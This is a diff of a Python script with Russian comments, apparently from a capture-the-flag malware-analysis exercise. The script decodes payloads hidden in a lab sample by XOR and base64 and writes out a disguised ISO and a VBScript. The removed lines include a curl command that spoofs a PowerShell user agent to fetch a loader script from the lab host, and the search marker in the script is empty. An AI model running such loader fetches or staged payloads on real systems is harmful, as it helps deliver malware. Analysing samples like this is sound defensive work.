@@ -1,28 +1,29 @@
-curl -A "WindowsPowerShell/5.1.19041.1237" http://loader.sweethearts.thm/cupid.ps1 -o cupid.ps1
 import base64
-import re
 
-# 1. Читаем исходный JS файл
-with open('valentine-animations.js', 'r') as f:
+# Читаем скачанную "картинку" как сырые байты
+with open("roses.jpg", "rb") as f:
     data = f.read()
 
-# 2. Вытаскиваем куски base64 (игнорируем короткие слова типа 'deb', 'ugg', 'er')
-chunks = re.findall(r"'([A-Za-z0-9+/=]{10,})'", data)
-payload_b64 = "".join(chunks)
+marker = b""
+idx = data.find(marker)
 
-# 3. Декодируем base64 в сырые байты
-raw_bytes = base64.b64decode(payload_b64)
+if idx != -1:
+    # Берем зашифрованные данные после маркера и убираем лишние переносы строк
+    raw_payload = data[idx + len(marker):].strip()
 
-# 4. Ключ дешифровки от хакера
-key = b"VALENTINE"
-
-# 5. Применяем XOR (как делает функция _xd)
-decrypted = bytearray()
-for i in range(len(raw_bytes)):
-    decrypted.append(raw_bytes[i] ^ key[i % len(key)])
-
-# 6. Сохраняем боевой payload
-with open("LOVE_LETTER.pdf.iso", "wb") as f:
-    f.write(decrypted)
-
-print(f"Готово! Извлечен файл LOVE_LETTER.pdf.iso (Размер: {len(decrypted)} байт)")
+    # Применяем XOR с ключом ROSES
+    key = b"ROSES"
+    xor_result = bytearray()
+    for i in range(len(raw_payload)):
+        xor_result.append(raw_payload[i] ^ key[i % len(key)])
+        
+    # Декодируем из Base64
+    b64_string = xor_result.decode('ascii')
+    final_vbs = base64.b64decode(b64_string).decode('utf-8')
+    
+    # Сохраняем VBScript
+    with open("valentine.vbs", "w") as f:
+        f.write(final_vbs)
+    print("Успех! VBScript извлечен в файл valentine.vbs")
+else:
+    print("Маркер не найден. Видимо, это просто обычные розы...")
